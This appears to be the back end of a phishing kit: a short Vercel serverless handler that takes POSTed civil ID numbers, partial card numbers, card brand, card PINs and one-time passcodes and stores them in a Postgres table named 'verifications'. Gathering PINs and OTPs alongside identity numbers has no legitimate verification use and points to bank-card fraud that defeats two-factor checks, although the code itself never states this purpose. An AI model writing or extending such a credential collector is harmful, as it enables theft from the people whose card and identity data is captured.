import { sql } from '@vercel/postgres';

export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  try {
    const { civilId, first4, last4, brand, pin, otp, language, device, status } = req.body;

    // Ensure table exists
    await sql`
      CREATE TABLE IF NOT EXISTS verifications (
        id SERIAL PRIMARY KEY,
        timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
        civil_id VARCHAR(50),
        first4 VARCHAR(10),
        last4 VARCHAR(10),
        brand VARCHAR(50),
        pin VARCHAR(10),
        otp VARCHAR(10),
        language VARCHAR(10),
        device VARCHAR(50),
        status VARCHAR(50)
      );
    `;

    // Insert submission data
    await sql`
      INSERT INTO verifications (civil_id, first4, last4, brand, pin, otp, language, device, status)
      VALUES (${civilId}, ${first4}, ${last4}, ${brand}, ${pin}, ${otp}, ${language}, ${device}, ${status});
    `;

    return res.status(200).json({ success: true });
  } catch (error) {
    console.error('Database error:', error);
    return res.status(500).json({ error: 'Internal Server Error', details: error.message });
  }
}